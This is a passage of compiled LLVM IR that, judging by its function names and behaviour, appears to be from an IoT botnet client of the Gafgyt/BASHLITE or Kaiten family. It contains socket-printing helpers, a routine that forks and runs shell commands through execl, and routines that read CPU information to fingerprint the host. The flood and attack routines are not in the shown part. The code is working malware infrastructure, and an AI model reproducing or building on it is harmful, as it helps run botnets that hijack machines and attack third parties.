  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #15
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i64 @strlen(i8* %5) #15
  %12 = call i64 @send(i32 %0, i8* %5, i64 %11, i32 16384) #3
  %13 = trunc i64 %12 to i32
  call void @free(i8* %5) #3
  ret i32 %13
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #16
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.130, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.39, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.131, i64 0, i64 0), i8* %0, i8* null) #3
  call void @_exit(i32 127) #17
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #3
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #3
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #18
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #15
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #15
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #15
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) local_unnamed_addr #1 {
  %2 = alloca [4096 x i8], align 16
  %3 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.132, i64 0, i64 0), i32 0) #3
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %5 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %24
  call void @uppercase(i8* nonnull %4)
  %strncmp = call i32 @strncmp(i8* nonnull %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.133, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %7, label %24

; <label>:7:                                      ; preds = %.lr.ph
  %8 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 8
  br label %9

; <label>:9:                                      ; preds = %.critedge, %7
  %.0 = phi i8* [ %8, %7 ], [ %11, %.critedge ]
  %10 = load i8, i8* %.0, align 1
  switch i8 %10, label %.preheader.preheader [
    i8 32, label %.critedge
    i8 9, label %.critedge
    i8 58, label %.critedge
  ]

.preheader.preheader:                             ; preds = %9
  br label %.preheader

.critedge:                                        ; preds = %9, %9, %9
  %11 = getelementptr inbounds i8, i8* %.0, i64 1
  br label %9

.preheader:                                       ; preds = %.preheader.preheader, %16
  %12 = call i64 @strlen(i8* %.0) #15
  %13 = add i64 %12, -1
  %14 = getelementptr inbounds i8, i8* %.0, i64 %13
  %15 = load i8, i8* %14, align 1
  switch i8 %15, label %17 [
    i8 13, label %16
    i8 10, label %16
  ]

; <label>:16:                                     ; preds = %.preheader, %.preheader
  store i8 0, i8* %14, align 1
  br label %.preheader

; <label>:17:                                     ; preds = %.preheader
  %18 = call i8* @strchr(i8* nonnull %.0, i32 46) #15
  %19 = icmp eq i8* %18, null
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  store i8 0, i8* %18, align 1
  br label %21

; <label>:21:                                     ; preds = %17, %20
  %22 = call i8* @strcpy(i8* %0, i8* nonnull %.0) #3
  %23 = call i32 @close(i32 %3) #3
  br label %28

; <label>:24:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 4096, i32 16, i1 false)
  %25 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %26 = icmp eq i8* %25, null
  br i1 %26, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %24
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %27 = call i32 @close(i32 %3) #3
  br label %28

; <label>:28:                                     ; preds = %._crit_edge, %21
  %.017 = phi i32 [ 0, %21 ], [ 1, %._crit_edge ]
  ret i32 %.017
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.132, i64 0, i64 0), i32 0) #3
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  %4 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.04 = phi i32 [ %..0, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  call void @uppercase(i8* nonnull %3)
  %strncmp = call i32 @strncmp(i8* nonnull %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.133, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  %6 = zext i1 %cmp to i32
  %..0 = add nsw i32 %6, %.04
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 4096, i32 16, i1 false)
  %7 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %8 = icmp eq i8* %7, null
